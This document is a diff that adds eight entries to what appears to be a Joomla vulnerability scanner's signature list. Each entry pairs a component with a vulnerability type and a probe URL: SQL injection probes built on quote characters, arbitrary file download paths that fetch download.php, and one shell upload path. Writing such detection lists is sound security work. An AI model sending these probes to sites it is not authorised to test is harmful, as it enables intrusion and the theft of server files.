@@ -1,0 +1,8 @@
+/com_hdflvplayer/:Arbritary File Download:/components/com_hdflvplayer/hdflvplayer/download.php?f=download.php:
+/com_youtubegallery/:SQL injection:/index.php?option=com_youtubegallery&view=youtubegallery&listid=2&themeid=2%27:
+/com_spidercalendar/:SQL injection:/index.php?option=com_spidercalendar&view=spidercalendar&calendar_id=1%27:
+/com_formmaker/:SQL injection:/index.php?option=com_formmaker&view=formmaker&id=1':
+/com_facegallery/:SQL injection:/index.php?option=com_facegallery&view=images&aid=1&lang=en:
+/com_creativecontactform/:Shell Upload:/components/com_creativecontactform/:
+/com_macgallery/:Arbritary File Download:/index.php?option=com_macgallery&view=download&albumid=download.php:
+/com_spidercontacts/:SQL injection:/index.php?option=com_spidercontacts&contact_id=%27&view=showcontact&lang=en:
